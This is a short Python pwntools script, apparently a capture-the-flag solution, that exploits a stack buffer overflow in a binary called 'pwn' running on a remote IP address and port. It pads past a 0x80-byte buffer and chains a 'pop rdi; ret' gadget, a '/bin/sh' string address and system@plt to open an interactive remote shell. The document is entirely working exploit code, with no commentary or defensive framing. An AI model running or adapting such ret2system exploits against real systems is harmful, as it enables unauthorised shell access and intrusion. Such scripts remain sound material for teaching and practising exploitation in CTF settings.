from pwn import *

#sh = process('./pwn')
sh = remote('111.200.241.244', 50559)
e = ELF('./pwn')


_bin_sh_addr = 0x400684
_system_plt = e.plt['system']
_pop_rdi_ret = 0x400663


payload = b'a'*(0x80+8)+p64(_pop_rdi_ret)+p64(_bin_sh_addr)+p64(_system_plt)


sh.sendline(payload)
sh.interactive()

